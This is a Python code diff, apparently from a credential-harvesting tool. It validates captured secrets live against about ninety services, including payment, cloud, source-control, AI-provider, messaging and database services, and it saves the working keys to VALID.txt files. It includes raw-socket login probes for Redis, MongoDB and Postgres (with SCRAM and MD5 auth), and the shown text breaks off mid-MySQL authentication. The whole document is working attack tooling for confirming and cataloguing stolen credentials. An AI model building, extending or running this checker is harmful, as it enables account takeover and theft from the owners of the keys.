+def emit(service, url, method, pairs, status, note, targets):
+    key = (service, url, tuple(pairs))
+    with LOCK:
+        if key in SEEN:
+            return
+        SEEN.add(key)
+        COUNTER['hits'] += 1
+
+    block = build_block(url, method, pairs, status, note)
+    for t in targets:
+        save(os.path.join(RESULTS, t), block)
+
+    if status == 'VALID':
+        with LOCK:
+            COUNTER['valid'] += 1
+        save(os.path.join(RESULTS, 'VALID.txt'), block)
+        save(os.path.join(RESULTS, 'VALID_%s.txt' % service), block)
+        if PRINT_VALID:
+            summary = ' | '.join('%s=%s' % (k, v) for k, v in pairs[:3])
+            print('   \033[32;1m>> VALID\033[0m %s %s :: %s' % (service, url, summary[:120]))
+
+
+# ===========================================================================
+#                        V E R I F I C A T I O N
+# ===========================================================================
+def _spec(url, auth=None, extract=None, check=None, method='GET',
+          headers=None, defaults=None, ok=(200,), bad=(401, 403)):
+    return dict(url=url, auth=auth, extract=extract or [], check=check,
+                method=method, headers=headers or {}, defaults=defaults or {},
+                ok=ok, bad=bad)
+
+
+def _chk_json_flag(flag_key='ok'):
+    def inner(r):
+        try:
+            j = r.json()
+        except Exception:
+            return ('UNKNOWN', 'bad json')
+        return ('VALID', str(j)[:90]) if j.get(flag_key) else ('INVALID', str(j)[:90])
+    return inner
+
+
+def _chk_datadog(r):
+    try:
+        j = r.json()
+    except Exception:
+        return ('UNKNOWN', 'bad json')
+    return ('VALID', 'api_key valid') if j.get('valid') else ('INVALID', 'api_key invalid')
+
+
+def _chk_cloudflare(r):
+    try:
+        j = r.json()
+    except Exception:
+        return ('UNKNOWN', 'bad json')
+    return ('VALID', str(j.get('result'))[:90]) if j.get('success') else ('INVALID', str(j.get('errors'))[:90])
+
+
+def _chk_paypal(r):
+    try:
+        j = r.json()
+    except Exception:
+        return ('UNKNOWN', 'bad json')
+    if j.get('access_token'):
+        return ('VALID', 'expires_in=%s' % j.get('expires_in'))
+    return ('INVALID', str(j)[:90])
+
+
+def _chk_docker(r):
+    try:
+        j = r.json()
+    except Exception:
+        return ('UNKNOWN', 'bad json')
+    return ('VALID', 'token issued') if j.get('token') else ('INVALID', str(j)[:90])
+
+
+def _chk_firebase(r):
+    if r.status_code == 200:
+        return ('VALID', 'database readable')
+    return ('UNKNOWN', 'HTTP %d' % r.status_code)
+
+
+HTTP_CHECKS = {
+    # ---- email ----
+    'SENDGRID': _spec('https://api.sendgrid.com/v3/scopes',
+                      ('bearer', ['SENDGRID_API_KEY']), extract=['scopes']),
+    'MAILGUN': _spec('https://api.mailgun.net/v3/domains',
+                     ('basic', ['MAILGUN_API_KEY'], ['MAILGUN_API_KEY']),
+                     extract=['total_count']),
+    'POSTMARK': _spec('https://api.postmarkapp.com/server',
+                      ('header', 'X-Postmark-Server-Token',
+                       ['POSTMARK_SERVER_TOKEN', 'POSTMARK_API_TOKEN']),
+                      extract=['Name', 'ID']),
+    'RESEND': _spec('https://api.resend.com/domains',
+                    ('bearer', ['RESEND_API_KEY']), extract=['data']),
+    'BREVO': _spec('https://api.brevo.com/v3/account',
+                   ('header', 'api-key', ['BREVO_API_KEY', 'SENDINBLUE_API_KEY']),
+                   extract=['email', 'companyName']),
+    'SENDINBLUE': _spec('https://api.brevo.com/v3/account',
+                        ('header', 'api-key', ['SENDINBLUE_API_KEY', 'BREVO_API_KEY']),
+                        extract=['email']),
+    'SPARKPOST': _spec('https://api.sparkpost.com/api/v1/account',
+                       ('raw', ['SPARKPOST_API_KEY'], ''),
+                       extract=['company_id']),
+    'MAILJET': _spec('https://api.mailjet.com/v3/REST/sender',
+                     ('basic', ['MAILJET_API_KEY'], ['MAILJET_API_SECRET']),
+                     extract=['Count']),
+    'MAILCHIMP': _spec('https://api.mailchimp.com/3.0/',
+                       ('basic', ['MAILCHIMP_ACCOUNT_ID'], ['MAILCHIMP_API_KEY']),
+                       extract=['account_name']),
+    'MAILTRAP': _spec('https://mailtrap.io/api/accounts',
+                      ('header', 'Api-Token',
+                       ['MAILTRAP_API_TOKEN', 'MAILTRAP_CLIENT_ID'])),
+    'SMTP2GO': _spec('https://api.smtp2go.com/v3/api_keys',
+                     None, defaults={'x': ''}),
+
+    # ---- comms ----
+    'TWILIO': _spec('https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}.json',
+                    ('basic', ['TWILIO_ACCOUNT_SID'], ['TWILIO_AUTH_TOKEN']),
+                    extract=['friendly_name', 'status']),
+    'VONAGE': _spec('https://rest.nexmo.com/account/get-balance?api_key={VONAGE_API_KEY}&api_secret={VONAGE_API_SECRET}',
+                    None, extract=['value']),
+    'PLIVO': _spec('https://api.plivo.com/v1/Account/{PLIVO_AUTH_ID}/',
+                   ('basic', ['PLIVO_AUTH_ID'], ['PLIVO_AUTH_TOKEN']),
+                   extract=['name', 'id']),
+    'MESSAGEBIRD': _spec('https://api.messagebird.com/v1/organizations',
+                         ('bearer', ['MESSAGEBIRD_ACCESS_TOKEN', 'MESSAGEBIRD_API_KEY'])),
+    'TELNYX': _spec('https://api.telnyx.com/v2/phone_numbers',
+                    ('bearer', ['TELNYX_API_KEY'])),
+    'INFOBIP': _spec('https://api.infobip.com/account/1/balance',
+                     ('basic', ['INFOBIP_USERNAME'], ['INFOBIP_PASSWORD'])),
+
+    # ---- dev / vcs ----
+    'GITHUB': _spec('https://api.github.com/user',
+                    ('bearer', ['GITHUB_TOKEN', 'GITHUB_PAT']),
+                    extract=['login', 'name', 'plan']),
+    'GITLAB': _spec('https://gitlab.com/api/v4/user',
+                    ('header', 'PRIVATE-TOKEN', ['GITLAB_TOKEN', 'GITLAB_PAT']),
+                    extract=['username', 'email']),
+    'BITBUCKET': _spec('https://api.bitbucket.org/2.0/user',
+                       ('basic', ['BITBUCKET_USERNAME'],
+                        ['BITBUCKET_PASSWORD', 'BITBUCKET_API_TOKEN']),
+                       extract=['display_name']),
+    'DOCKER': _spec('https://hub.docker.com/v2/users/login',
+                    None, method='POST', check=_chk_docker),
+    'NPM': _spec('https://registry.npmjs.org/-/whoami',
+                 ('bearer', ['NPM_TOKEN', 'NPM_API_KEY']), extract=['username']),
+    'CIRCLECI': _spec('https://circleci.com/api/v1.1/me',
+                      ('header', 'Circle-Token', ['CIRCLECI_TOKEN', 'CIRCLE_TOKEN']),
+                      extract=['name', 'login']),
+    'TERRAFORM': _spec('https://app.terraform.io/api/v2/account/details',
+                       ('bearer', ['TF_TOKEN', 'TF_API_TOKEN'])),
+    'PULUMI': _spec('https://api.pulumi.com/api/user',
+                    ('bearer', ['PULUMI_ACCESS_TOKEN', 'PULUMI_API_KEY'])),
+    'POSTMAN': _spec('https://api.getpostman.com/me',
+                     ('header', 'X-Api-Key', ['POSTMAN_API_KEY']),
+                     extract=['user']),
+
+    # ---- cloud / infra ----
+    'DIGITALOCEAN': _spec('https://api.digitalocean.com/v2/account',
+                          ('bearer', ['DIGITALOCEAN_TOKEN']),
+                          extract=['email', 'status']),
+    'LINODE': _spec('https://api.linode.com/v4/account',
+                    ('bearer', ['LINODE_TOKEN', 'LINODE_API_TOKEN']),
+                    extract=['email', 'company']),
+    'VULTR': _spec('https://api.vultr.com/v2/account',
+                   ('bearer', ['VULTR_API_KEY', 'VULTR_TOKEN']),
+                   extract=['email', 'name']),
+    'HETZNER': _spec('https://api.hetzner.cloud/v1/servers',
+                     ('bearer', ['HETZNER_API_TOKEN', 'HETZNER_TOKEN'])),
+    'HEROKU': _spec('https://api.heroku.com/account',
+                    ('bearer', ['HEROKU_API_KEY', 'HEROKU_TOKEN']),
+                    headers={'Accept': 'application/vnd.heroku+json; version=3'},
+                    extract=['email', 'name']),
+    'NETLIFY': _spec('https://api.netlify.com/api/v1/user',
+                     ('bearer', ['NETLIFY_PERSONAL_ACCESS_TOKEN',
+                                 'NETLIFY_AUTH_TOKEN', 'NETLIFY_API_KEY']),
+                     extract=['email', 'full_name']),
+    'VERCEL': _spec('https://api.vercel.com/v2/user',
+                    ('bearer', ['VERCEL_TOKEN', 'VERCEL_API_KEY', 'VERCEL_AUTH_TOKEN']),
+                    extract=['user']),
+    'CLOUDFLARE': _spec('https://api.cloudflare.com/client/v4/user/tokens/verify',
+                        ('bearer', ['CLOUDFLARE_API_TOKEN']), check=_chk_cloudflare),
+    'AIVEN': _spec('https://api.aiven.io/v1/me',
+                   ('bearer', ['AIVEN_API_TOKEN'])),
+    'RENDER': _spec('https://api.render.com/v1/owners?limit=1',
+                    ('bearer', ['RENDER_API_KEY'])),
+    'FASTLY': _spec('https://api.fastly.com/current_user',
+                    ('header', 'Fastly-Key', ['FASTLY_API_KEY']),
+                    extract=['login', 'email']),
+    'UPSTASH': _spec('{UPSTASH_REDIS_REST_URL}',
+                     ('bearer', ['UPSTASH_REDIS_REST_TOKEN'])),
+
+    # ---- monitoring ----
+    'DATADOG': _spec('https://api.datadoghq.com/api/v1/validate?api_key={DATADOG_API_KEY}',
+                     None, check=_chk_datadog),
+    'NEW_RELIC': _spec('https://api.newrelic.com/v2/applications.json',
+                       ('header', 'Api-Key', ['NEW_RELIC_API_KEY'])),
+    'SENTRY': _spec('https://sentry.io/api/0/projects/',
+                    ('bearer', ['SENTRY_AUTH_TOKEN'])),
+    'GRAFANA': _spec('{GRAFANA_URL}/api/user',
+                     ('bearer', ['GRAFANA_API_KEY', 'GRAFANA_SERVICE_ACCOUNT_TOKEN']),
+                     extract=['login', 'email', 'orgId']),
+    'HONEYCOMB': _spec('https://api.honeycomb.io/1/auth',
+                       ('header', 'X-Honeycomb-Team', ['HONEYCOMB_API_KEY'])),
+
+    # ---- AI ----
+    'OPENAI': _spec('https://api.openai.com/v1/models',
+                    ('bearer', ['OPENAI_API_KEY']), extract=['data']),
+    'ANTHROPIC': _spec('https://api.anthropic.com/v1/models',
+                       ('header', 'x-api-key', ['ANTHROPIC_API_KEY']),
+                       headers={'anthropic-version': '2023-06-01'}),
+    'GROQ': _spec('https://api.groq.com/openai/v1/models',
+                  ('bearer', ['GROQ_API_KEY'])),
+    'MISTRAL': _spec('https://api.mistral.ai/v1/models',
+                     ('bearer', ['MISTRAL_API_KEY'])),
+    'COHERE': _spec('https://api.cohere.com/v1/models',
+                    ('bearer', ['COHERE_API_KEY'])),
+    'TOGETHER_AI': _spec('https://api.together.xyz/v1/models',
+                         ('bearer', ['TOGETHER_API_KEY'])),
+    'OPENROUTER': _spec('https://openrouter.ai/api/v1/key',
+                        ('bearer', ['OPENROUTER_API_KEY'])),
+    'HUGGINGFACE': _spec('https://huggingface.co/api/whoami-v2',
+                         ('bearer', ['HUGGINGFACE_TOKEN', 'HUGGINGFACE_API_KEY',
+                                     'HUGGINGFACE_HUB_TOKEN', 'HF_TOKEN']),
+                         extract=['name', 'type']),
+    'REPLICATE': _spec('https://api.replicate.com/v1/account',
+                       ('raw', ['REPLICATE_API_TOKEN'], 'Token '),
+                       extract=['username']),
+    'ELEVENLABS': _spec('https://api.elevenlabs.io/v1/user',
+                        ('header', 'xi-api-key', ['ELEVENLABS_API_KEY'])),
+    'GOOGLE_GEMINI': _spec('https://generativelanguage.googleapis.com/v1beta/models?key={GOOGLE_GEMINI_API_KEY}',
+                           None),
+    'GOOGLE': _spec('https://www.googleapis.com/discovery/v1/apis?key={GOOGLE_API_KEY}',
+                    None),
+    'STABILITY': _spec('https://api.stability.ai/v1/user/account',
+                       ('bearer', ['STABILITY_API_KEY']),
+                       extract=['email']),
+    'NVIDIA_NIM': _spec('https://integrate.api.nvidia.com/v1/models',
+                        ('bearer', ['NVIDIA_API_KEY', 'NVIDIA_NIM_API_KEY'])),
+    'VERTEX_AI': _spec('https://us-central1-aiplatform.googleapis.com/v1/projects/{VERTEX_AI_PROJECT_ID}/locations/{VERTEX_AI_REGION}/models',
+                       ('bearer', ['VERTEX_AI_API_KEY'])),
+
+    # ---- vector / search ----
+    'ALGOLIA': _spec('https://{ALGOLIA_APPLICATION_ID}-dsn.algolia.net/1/indexes',
+                     ('header', 'X-Algolia-API-Key',
+                      ['ALGOLIA_ADMIN_KEY', 'ALGOLIA_API_KEY', 'ALGOLIA_SEARCH_ONLY_KEY']),
+                     headers={'X-Algolia-Application-Id': ''}),
+    'PINECONE': _spec('https://api.pinecone.io/indexes',
+                      ('header', 'Api-Key', ['PINECONE_API_KEY', 'PINECONE_API_TOKEN'])),
+    'QDRANT': _spec('{QDRANT_URL}/collections',
+                    ('header', 'api-key', ['QDRANT_API_KEY'])),
+    'TYPESENSE': _spec('http://{TYPESENSE_HOST}/collections',
+                       ('header', 'X-TYPESENSE-API-KEY', ['TYPESENSE_API_KEY']),
+                       defaults={'TYPESENSE_HOST': 'localhost:8108'}),
+    'MEILISEARCH': _spec('{MEILISEARCH_HOST}/indexes',
+                         ('bearer', ['MEILISEARCH_MASTER_KEY', 'MEILISEARCH_API_KEY'])),
+    'WEAVIATE': _spec('{WEAVIATE_URL}/v1/meta',
+                      ('bearer', ['WEAVIATE_API_KEY'])),
+
+    # ---- payments ----
+    'STRIPE': _spec('https://api.stripe.com/v1/account',
+                    ('bearer', ['STRIPE_SECRET_KEY', 'STRIPE_API_KEY', 'STRIPE_KEY']),
+                    extract=['id', 'email', 'country', 'default_currency']),
+    'PAYPAL': _spec('https://api-m.paypal.com/v1/oauth2/token',
+                    ('basic', ['PAYPAL_CLIENT_ID'], ['PAYPAL_CLIENT_SECRET']),
+                    method='POST', check=_chk_paypal,
+                    headers={'Accept': 'application/json'}),
+    'SQUARE': _spec('https://connect.squareup.com/v2/locations',
+                    ('bearer', ['SQUARE_ACCESS_TOKEN'])),
+    'MOLLIE': _spec('https://api.mollie.com/v2/organizations/me',
+                    ('bearer', ['MOLLIE_API_KEY', 'MOLLIE_API_TOKEN'])),
+    'RAZORPAY': _spec('https://api.razorpay.com/v1/payments?count=1',
+                      ('basic', ['RAZORPAY_KEY_ID'], ['RAZORPAY_KEY_SECRET'])),
+    'XENDIT': _spec('https://api.xendit.co/balance',
+                    ('basic', ['XENDIT_SECRET_KEY'], ['XENDIT_SECRET_KEY'])),
+    'BRAINTREE': _spec('https://api.braintreegateway.com/merchants/{BRAINTREE_MERCHANT_ID}/client_token',
+                       None, method='POST'),
+    'ADYEN': _spec('https://checkout-test.adyen.com/v70/paymentMethods',
+                   ('header', 'x-API-key', ['ADYEN_API_KEY'])),
+
+    # ---- social / collab ----
+    'SLACK': _spec('https://slack.com/api/auth.test',
+                   ('bearer', ['SLACK_BOT_TOKEN', 'SLACK_TOKEN']),
+                   method='POST', check=_chk_json_flag('ok')),
+    'DISCORD': _spec('https://discord.com/api/v10/users/@me',
+                     ('raw', ['DISCORD_BOT_TOKEN', 'DISCORD_TOKEN'], 'Bot '),
+                     extract=['username', 'id']),
+    'TELEGRAM': _spec('https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe',
+                      None, check=_chk_json_flag('ok')),
+    'NOTION': _spec('https://api.notion.com/v1/users/me',
+                    ('bearer', ['NOTION_TOKEN', 'NOTION_API_KEY', 'NOTION_INTEGRATION_TOKEN']),
+                    headers={'Notion-Version': '2022-06-28'},
+                    extract=['name', 'type']),
+    'ASANA': _spec('https://app.asana.com/api/1.0/users/me',
+                   ('bearer', ['ASANA_PAT', 'ASANA_ACCESS_TOKEN', 'ASANA_API_KEY'])),
+    'TRELLO': _spec('https://api.trello.com/1/members/me?key={TRELLO_API_KEY}&token={TRELLO_API_TOKEN}',
+                    None, extract=['username', 'email']),
+    'ZOOM': _spec('https://api.zoom.us/v2/users/me',
+                  ('bearer', ['ZOOM_API_TOKEN', 'ZOOM_ACCESS_TOKEN'])),
+    'INTERCOM': _spec('https://api.intercom.io/me',
+                      ('bearer', ['INTERCOM_API_TOKEN'])),
+    'HUBSPOT': _spec('https://api.hubapi.com/account-info/v3/details',
+                     ('bearer', ['HUBSPOT_ACCESS_TOKEN', 'HUBSPOT_API_KEY',
+                                 'HUBSPOT_PRIVATE_APP_TOKEN'])),
+    'POSTHOG': _spec('https://app.posthog.com/api/users/@me/',
+                     ('bearer', ['POSTHOG_API_KEY'])),
+    'ONE_SIGNAL': _spec('https://onesignal.com/api/v1/apps',
+                        ('raw', ['ONE_SIGNAL_REST_API_KEY', 'ONE_SIGNAL_API_KEY'], 'Basic ')),
+    'NS1': _spec('https://api.nsone.net/v1/zones',
+                 ('header', 'X-NSONE-Key', ['NS1_API_KEY'])),
+
+    # ---- databases (http speaking) ----
+    'ELASTICSEARCH': _spec('{ELASTICSEARCH_HOST}:{ELASTICSEARCH_PORT}/',
+                           ('basic', ['ELASTICSEARCH_USERNAME'], ['ELASTICSEARCH_PASSWORD']),
+                           defaults={'ELASTICSEARCH_HOST': '', 'ELASTICSEARCH_PORT': '9200'},
+                           extract=['cluster_name', 'version']),
+    'OPENSEARCH': _spec('{OPENSEARCH_HOST}:{OPENSEARCH_PORT}/',
+                        ('basic', ['OPENSEARCH_USERNAME'], ['OPENSEARCH_PASSWORD']),
+                        defaults={'OPENSEARCH_PORT': '9200'},
+                        extract=['cluster_name']),
+    'CLICKHOUSE': _spec('http://{CLICKHOUSE_HOST}:{CLICKHOUSE_PORT}/ping',
+                        ('basic', ['CLICKHOUSE_USER'], ['CLICKHOUSE_PASSWORD']),
+                        defaults={'CLICKHOUSE_USER': 'default',
+                                  'CLICKHOUSE_PORT': '8123'}),
+    'NEO4J': _spec('{NEO4J_URI}/',
+                   ('basic', ['NEO4J_USERNAME'], ['NEO4J_PASSWORD']),
+                   extract=['neo4j_version']),
+    'COUCHDB': _spec('http://{COUCHDB_HOST}:{COUCHDB_PORT}/',
+                     ('basic', ['COUCHDB_USERNAME'], ['COUCHDB_PASSWORD']),
+                     defaults={'COUCHDB_PORT': '5984'},
+                     extract=['couchdb', 'version']),
+    'INFLUXDB': _spec('{INFLUXDB_URL}/ping',
+                      ('bearer', ['INFLUXDB_TOKEN', 'INFLUXDB_ACCESS_TOKEN'])),
+    'SUPABASE': _spec('{SUPABASE_URL}/rest/v1/',
+                      ('header', 'apikey', ['SUPABASE_SERVICE_ROLE_KEY', 'SUPABASE_ANON_KEY'])),
+    'FIREBASE': _spec('{FIREBASE_DATABASE_URL}/.json?shallow=true',
+                      None, check=_chk_firebase),
+}
+
+CUSTOM_CHECKS = {}
+
+
+def verify(service, data):
+    if not VERIFY:
+        return ('UNKNOWN', '')
+    ck = (service, tuple(sorted((k, v) for k, v in data.items()
+                                if k in _VERIFY_RELEVANT)))
+    with LOCK:
+        if ck in VERIFY_CACHE:
+            return VERIFY_CACHE[ck]
+
+    result = ('UNKNOWN', '')
+    try:
+        fn = CUSTOM_CHECKS.get(service)
+        if fn is not None:
+            result = fn(data)
+        elif service in HTTP_CHECKS:
+            result = run_http_check(service, HTTP_CHECKS[service], data)
+        elif service in TCP_CHECKS:
+            result = TCP_CHECKS[service](data)
+    except Exception as e:
+        result = ('ERROR', str(e)[:70])
+
+    with LOCK:
+        VERIFY_CACHE[ck] = result
+    return result
+
+
+_VERIFY_RELEVANT = set()
+for _s, _d in HTTP_CHECKS.items():
+    _a = _d.get('auth')
+    if _a:
+        for _part in _a[1:]:
+            if isinstance(_part, list):
+                _VERIFY_RELEVANT.update(_part)
+    _VERIFY_RELEVANT.update(re.findall(r'\{([A-Z0-9_]+)\}', _d.get('url', '')))
+
+
+def _auth_parts(spec, data):
+    a = spec.get('auth')
+    if not a:
+        return {}, None, ''
+    kind = a[0]
+    if kind == 'bearer':
+        v = pick(data, a[1])
+        return ({'Authorization': 'Bearer ' + v}, None, '') if v else (None, None, '')
+    if kind == 'raw':
+        v = pick(data, a[1])
+        return ({'Authorization': a[2] + v}, None, '') if v else (None, None, '')
+    if kind == 'header':
+        v = pick(data, a[2])
+        return ({a[1]: v}, None, '') if v else (None, None, '')
+    if kind == 'basic':
+        u = pick(data, a[1])
+        p = pick(data, a[2], '')
+        return ({}, (u, p), '') if u else (None, None, '')
+    if kind == 'query':
+        v = pick(data, a[1])
+        return ({}, None, ('&' if '?' in spec['url'] else '?') + a[2] + '=' + v) if v else (None, None, '')
+    return {}, None, ''
+
+
+def run_http_check(service, spec, data):
+    url = spec['url']
+    for ph in set(re.findall(r'\{([A-Z0-9_]+)\}', url)):
+        v = pick(data, [ph]) or spec['defaults'].get(ph, '')
+        if not v:
+            return ('UNKNOWN', 'missing ' + ph)
+        url = url.replace('{' + ph + '}', v)
+    if not url.startswith('http'):
+        url = 'http://' + url
+
+    headers = dict(spec['headers'])
+    headers.update(HEADERS)
+    ah, auth, suffix = _auth_parts(spec, data)
+    if ah is None and auth is None:
+        return ('UNKNOWN', 'missing key')
+    if ah:
+        headers.update(ah)
+    url += suffix
+
+    body = None
+    if spec['method'] == 'POST' and service == 'DOCKER':
+        u = pick(data, ['DOCKER_USERNAME'])
+        p = pick(data, ['DOCKER_PASSWORD'])
+        if not u or not p:
+            return ('UNKNOWN', 'missing credentials')
+        headers['Content-Type'] = 'application/json'
+        body = json.dumps({'username': u, 'password': p})
+    elif spec['method'] == 'POST' and service == 'PAYPAL':
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
+        body = 'grant_type=client_credentials'
+
+    r = _get(url, method=spec['method'], data=body, timeout=VERIFY_TIMEOUT)
+    if r is None:
+        return ('ERROR', 'no response')
+
+    if spec.get('check'):
+        return spec['check'](r)
+    if r.status_code in spec['ok']:
+        note = ''
+        if spec['extract']:
+            try:
+                j = r.json()
+                bits = []
+                for k in spec['extract']:
+                    if k in j:
+                        bits.append('%s=%s' % (k, str(j[k])[:40]))
+                note = ' '.join(bits)[:120]
+            except Exception:
+                note = ''
+        return ('VALID', note)
+    if r.status_code in spec['bad']:
+        return ('INVALID', 'HTTP %d' % r.status_code)
+    return ('UNKNOWN', 'HTTP %d' % r.status_code)
+
+
+# ---------------------------------------------------------------------------
+# socket protocol probes
+# ---------------------------------------------------------------------------
+def _sock(host, port, timeout=None):
+    try:
+        s = socket.create_connection((host, int(port)), timeout or VERIFY_TIMEOUT)
+        s.settimeout(timeout or VERIFY_TIMEOUT)
+        return s
+    except Exception:
+        return None
+
+
+def _recv_exact(s, n):
+    buf = b''
+    while len(buf) < n:
+        try:
+            chunk = s.recv(n - len(buf))
+        except Exception:
+            return None
+        if not chunk:
+            return None
+        buf += chunk
+    return buf
+
+
+def probe_redis(data):
+    host = pick(data, ['REDIS_HOST', 'REDIS_SERVER'])
+    if not host:
+        return ('UNKNOWN', '')
+    port = pick(data, ['REDIS_PORT']) or '6379'
+    pwd = pick(data, ['REDIS_PASSWORD', 'REDIS_PASS'])
+    s = _sock(host, port)
+    if not s:
+        return ('ERROR', 'port closed')
+    try:
+        s.sendall(b'PING\r\n')
+        line = s.recv(256).decode('utf-8', 'ignore').strip()
+        if line.startswith('+PONG'):
+            return ('OPEN', 'no auth required')
+        if line.startswith('-NOAUTH') or line.startswith('-ERR'):
+            if not pwd:
+                return ('OPEN', 'auth required, no password')
+            s.sendall(('AUTH %s\r\n' % pwd).encode())
+            r = s.recv(256).decode('utf-8', 'ignore').strip()
+            if r.startswith('+OK'):
+                return ('VALID', 'AUTH ok')
+            return ('INVALID', r[:70])
+        return ('UNKNOWN', line[:70])
+    except Exception:
+        return ('UNKNOWN', 'proto error')
+    finally:
+        s.close()
+
+
+def probe_memcached(data):
+    host = pick(data, ['MEMCACHED_HOST'])
+    if not host:
+        return ('UNKNOWN', '')
+    port = pick(data, ['MEMCACHED_PORT']) or '11211'
+    s = _sock(host, port)
+    if not s:
+        return ('ERROR', 'port closed')
+    try:
+        s.sendall(b'stats\r\n')
+        out = s.recv(512).decode('utf-8', 'ignore')
+        if 'STAT' in out:
+            return ('OPEN', 'memcached reachable')
+        return ('UNKNOWN', out[:70])
+    except Exception:
+        return ('UNKNOWN', 'proto error')
+    finally:
+        s.close()
+
+
+def probe_mongo(data):
+    host = pick(data, ['MONGODB_HOST', 'MONGO_HOST'])
+    if not host:
+        return ('UNKNOWN', '')
+    port = pick(data, ['MONGODB_PORT']) or '27017'
+    s = _sock(host, port)
+    if not s:
+        return ('ERROR', 'port closed')
+    try:
+        # legacy OP_QUERY isMaster on admin.$cmd
+        doc = b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
+        q = struct.pack('<i', 0) + b'admin.$cmd\x00' + struct.pack('<ii', 0, -1) + doc
+        pkt = struct.pack('<iiii', 16 + len(q), 1, 0, 2004) + q
+        s.sendall(pkt)
+        head = _recv_exact(s, 36)
+        if not head:
+            return ('UNKNOWN', 'no reply')
+        ln = struct.unpack('<i', head[:4])[0]
+        body = _recv_exact(s, ln - 36) or b''
+        txt = body.decode('utf-8', 'ignore')
+        if '"ok"' in txt or 'maxWireVersion' in txt or 'isWritablePrimary' in txt:
+            return ('OPEN', 'mongod reachable (auth not verified)')
+        return ('UNKNOWN', 'unexpected reply')
+    except Exception:
+        return ('UNKNOWN', 'proto error')
+    finally:
+        s.close()
+
+
+def probe_rabbit(data):
+    host = pick(data, ['RABBITMQ_HOST'])
+    if not host:
+        return ('UNKNOWN', '')
+    port = pick(data, ['RABBITMQ_PORT']) or '5672'
+    s = _sock(host, port)
+    if not s:
+        return ('ERROR', 'port closed')
+    try:
+        s.sendall(b'AMQP\x00\x00\x09\x01')
+        head = s.recv(8)
+        if head.startswith(b'AMQP'):
+            return ('OPEN', 'rabbitmq reachable')
+        return ('UNKNOWN', head[:20].hex())
+    except Exception:
+        return ('UNKNOWN', 'proto error')
+    finally:
+        s.close()
+
+
+def probe_tcp(host_keys, port_keys, default_port, label):
+    def inner(data):
+        host = pick(data, host_keys)
+        if not host:
+            return ('UNKNOWN', '')
+        port = pick(data, port_keys) or str(default_port)
+        s = _sock(host, port, timeout=4)
+        if not s:
+            return ('ERROR', 'port closed')
+        s.close()
+        return ('OPEN', '%s port open' % label)
+    return inner
+
+
+def probe_postgres(data):
+    host = pick(data, ['POSTGRES_HOST', 'PGHOST', 'POSTGRES_SERVER'])
+    if not host:
+        return ('UNKNOWN', '')
+    port = pick(data, ['POSTGRES_PORT', 'PGPORT']) or '5432'
+    user = pick(data, ['POSTGRES_USER', 'PGUSER']) or 'postgres'
+    pwd = pick(data, ['POSTGRES_PASSWORD', 'PGPASSWORD'])
+    db = pick(data, ['POSTGRES_DB', 'POSTGRES_DATABASE', 'PGDATABASE']) or 'postgres'
+
+    s = _sock(host, port)
+    if not s:
+        return ('ERROR', 'port closed')
+    try:
+        params = (b'user\x00' + user.encode() + b'\x00database\x00' +
+                  db.encode() + b'\x00\x00')
+        body = struct.pack('!i', 196608) + params
+        s.sendall(struct.pack('!i', len(body) + 4) + body)
+
+        nonce = ''
+        first_bare = ''
+
+        def read_msg():
+            hdr = _recv_exact(s, 5)
+            if not hdr:
+                return None, None
+            ln = struct.unpack('!i', hdr[1:5])[0]
+            return hdr[0:1], (_recv_exact(s, ln - 4) if ln > 4 else b'')
+
+        while True:
+            t, b = read_msg()
+            if t is None:
+                return ('UNKNOWN', 'no reply')
+            if t == b'E':
+                msg = b.decode('latin1', 'ignore')
+                m = re.search(r'S([^\x00]*)\x00', msg)
+                return ('INVALID', (m.group(1) if m else msg)[:80])
+            if t == b'R':
+                code = struct.unpack('!i', b[:4])[0]
+                if code == 0:
+                    return ('VALID', 'postgres login ok (user=%s)' % user)
+                if code == 3:
+                    if not pwd:
+                        return ('OPEN', 'cleartext auth required')
+                    msg = pwd.encode() + b'\x00'
+                    s.sendall(b'p' + struct.pack('!i', len(msg) + 4) + msg)
+                    continue
+                if code == 5:
+                    if not pwd:
+                        return ('OPEN', 'md5 auth required')
+                    salt = b[4:8]
+                    inner = hashlib.md5(pwd.encode() + user.encode()).hexdigest().encode()
+                    outer = hashlib.md5(inner + salt).hexdigest()
+                    msg = b'md5' + outer.encode() + b'\x00'
+                    s.sendall(b'p' + struct.pack('!i', len(msg) + 4) + msg)
+                    continue
+                if code == 10:
+                    if not pwd:
+                        return ('OPEN', 'scram auth required')
+                    mech = b[4:].split(b'\x00')[0]
+                    if mech != b'SCRAM-SHA-256':
+                        return ('UNKNOWN', mech.decode('latin1', 'ignore'))
+                    nonce = base64.b64encode(os.urandom(18)).decode()
+                    first_bare = 'n=,r=' + nonce
+                    initial = 'n,,' + first_bare
+                    payload = mech + b'\x00' + struct.pack('!i', len(initial)) + initial.encode()
+                    s.sendall(b'p' + struct.pack('!i', len(payload) + 4) + payload)
+                    continue
+                if code == 11:
+                    server_first = b[4:].decode('latin1', 'ignore')
+                    parts = dict(p.split('=', 1) for p in server_first.split(',') if '=' in p)
+                    snonce = parts.get('r', '')
+                    salt = base64.b64decode(parts.get('s', ''))
+                    it = int(parts.get('i', '4096'))
+                    salted = hashlib.pbkdf2_hmac('sha256', pwd.encode(), salt, it, 32)
+                    ck = hmac.new(salted, b'Client Key', hashlib.sha256).digest()
+                    sk = hashlib.sha256(ck).digest()
+                    final_np = 'c=biws,r=' + snonce
+                    auth_msg = (first_bare + ',' + server_first + ',' + final_np).encode()
+                    sig = hmac.new(sk, auth_msg, hashlib.sha256).digest()
+                    proof = bytes(a ^ b for a, b in zip(ck, sig))
+                    final = final_np + ',p=' + base64.b64encode(proof).decode()
+                    s.sendall(b'p' + struct.pack('!i', len(final) + 4) + final.encode())
+                    continue
+                if code == 12:
+                    continue
+                return ('UNKNOWN', 'auth code %d' % code)
+            if t == b'Z':
+                return ('OPEN', 'ready')
+    except Exception:
+        return ('UNKNOWN', 'proto error')
+    finally:
+        s.close()
+
+
+def _mysql_native(pwd, salt):
+    s1 = hashlib.sha1(pwd).digest()
+    s2 = hashlib.sha1(s1).digest()
+    s3 = hashlib.sha1(salt + s2).digest()
+    return bytes(a ^ b for a, b in zip(s1, s3))
+
+
+def _mysql_sha2(pwd, salt):
+    s1 = hashlib.sha256(pwd).digest()
+    s2 = hashlib.sha256(s1).digest()
